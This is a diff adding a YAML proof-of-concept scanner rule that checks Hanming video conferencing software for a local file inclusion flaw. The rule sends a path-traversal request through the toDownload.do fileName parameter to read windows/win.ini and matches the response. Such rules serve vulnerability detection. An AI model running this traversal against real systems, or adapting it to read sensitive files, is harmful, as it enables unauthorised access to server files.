@@ -1,0 +1,10 @@
+name: poc-yaml-hanming-video-conferencing-lfi
+rules:
+  - method: GET
+    path: GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+    expression: |
+      response.status == 200 && "; for 16-bit app support".bmatches(response.body)
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://www.yuque.com/maxsecurity/zhvr7l/f0154537b7d531eaca52aeca36b37b5e
